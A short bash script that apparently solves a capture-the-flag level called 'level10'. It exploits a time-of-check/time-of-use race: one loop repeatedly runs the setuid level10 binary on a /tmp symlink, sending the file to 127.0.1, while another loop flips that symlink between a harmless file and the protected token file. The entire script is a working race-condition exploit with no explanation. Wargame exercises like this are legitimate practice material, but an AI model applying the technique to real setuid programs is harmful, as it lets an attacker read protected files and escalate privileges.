#!/bin/bash

file="file"
touch /tmp/$file

link="link"

while true
do
        /home/user/level10/level10 /tmp/$link 127.0.1 &> /dev/null
done &

while true
do
        ln -fs /home/user/level10/token /tmp/$link
        ln -fs /tmp/$file /tmp/$link
done
